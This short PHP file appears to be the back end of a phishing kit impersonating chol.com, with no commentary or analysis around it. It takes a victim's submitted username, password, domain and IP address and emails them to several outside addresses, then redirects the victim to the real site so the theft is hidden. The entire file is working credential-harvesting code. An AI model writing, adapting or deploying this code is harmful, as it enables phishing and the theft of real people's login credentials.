   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ chol.com +-----------connect---\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['passwd']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "suretools21@hotmail.com,suretools21@yahoo.com,ssportbet007@yahoo.com,spamtoolsbox@outlook.com,spamtools33@gmail.com";
$subject = "chol.com";
$headers = "From: obinna<logs@www.chol.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.chol.com/");
	  

?>